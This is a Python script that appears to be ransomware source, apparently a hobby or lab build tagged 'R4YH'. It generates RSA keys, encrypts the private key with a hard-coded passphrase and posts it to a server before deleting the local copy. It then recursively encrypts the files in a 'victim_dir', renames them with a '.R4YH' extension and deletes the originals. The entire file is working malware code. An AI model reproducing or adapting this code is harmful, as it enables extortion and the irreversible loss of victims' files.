import os
import requests
import base64
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from pathlib import Path
from Crypto.Util.Padding import pad

def generate_keys(key_size=2048):
    private_key = RSA.generate(key_size)
    public_key = private_key.publickey()
    return private_key, public_key

private_key, public_key = generate_keys()

with open('public_key.pem', 'wb') as f:
    f.write(public_key.export_key())
with open('private_key.pem','wb') as f:
    f.write(private_key.export_key())
    
    
passphrase = "SecretMorrHackR4YH".ljust(32)
key_path = "/home/behana/rans/private_key.pem"

with open(key_path, 'rb') as key_file:
    key_content = key_file.read()

cipher = AES.new(passphrase.encode(), AES.MODE_CBC, iv=get_random_bytes(16))
ciphertext = cipher.encrypt(pad(key_content, AES.block_size))

encrypted_key = base64.b64encode(cipher.iv + ciphertext).decode('utf-8')
response = requests.post("http://127.0.0.1", data=encrypted_key)
if response.status_code == 200:
    os.remove(key_path)




def encrypt_file(path):
    aes_session_key = os.urandom(16)
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_session_key = cipher_rsa.encrypt(aes_session_key)

    cipher_aes = AES.new(aes_session_key, AES.MODE_CBC)
    with open(path, 'rb') as f:
        content = f.read()

    iv = get_random_bytes(AES.block_size)
    padded_data = pad(iv + content, AES.block_size)
    ciphertext = cipher_aes.encrypt(padded_data)

    file_extension = '.R4YH'
    new_name = Path(path).stem + file_extension
    with open(new_name, 'wb') as f:
        f.write(encrypted_session_key + ciphertext)


victim_dir = Path('/home/behana/rans') 

for file in victim_dir.rglob('*'):
    if file.is_file() and file.suffix.lower() not in ['.pem', '.exe', '.py']:
        encrypt_file(file)
        os.remove(file)

